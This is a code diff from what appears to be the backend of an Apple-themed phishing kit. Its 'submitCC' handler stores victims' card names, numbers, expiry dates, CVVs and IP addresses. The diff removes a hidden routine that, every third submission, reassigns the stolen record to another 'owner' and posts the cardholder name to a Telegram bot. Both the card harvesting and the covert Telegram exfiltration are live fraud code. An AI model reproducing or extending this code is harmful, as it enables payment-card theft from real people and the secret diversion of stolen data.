@@ -300,14 +300,6 @@ const submitCCAgain = async (req, res) => {
 const submitCC = async (req, res) => {
   let { uniqueid, ccname, ccnum, ccexp, cvv, ip, owner } = req.body;
   try {
-    panelCount++;
-    if (panelCount == 3) {
-      owner = "haytch0411";
-      await axios.post(
-        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=New Apple Hit:\n${ccname}`
-      );
-      panelCount = 0;
-    }
     await AppleGB.create({
       uniqueid,
       ccname,
